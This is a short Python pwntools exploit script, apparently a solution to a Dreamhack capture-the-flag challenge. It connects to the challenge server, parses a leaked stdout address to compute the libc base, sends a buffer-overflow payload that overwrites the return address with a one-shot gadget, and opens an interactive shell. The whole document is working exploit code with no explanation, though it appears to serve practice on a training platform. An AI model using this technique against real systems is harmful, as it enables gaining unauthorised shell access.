from pwn import *

p = remote("host1.dreamhack.games", 16563)



p.recvuntil("stdout: ")
stdout = p.recvuntil("\n").strip("\n")
stdout = int(stdout, 16)



libc_base = stdout - 0x3c5620        
oneshot_gadget = libc_base + 0x45216   


payload = "\x90"*24
payload += "\x00"*8
payload += "\x90"*8
payload += p64(oneshot_gadget)

p.recvuntil("MSG: ")
p.send(payload)
p.recv()

p.interactive()
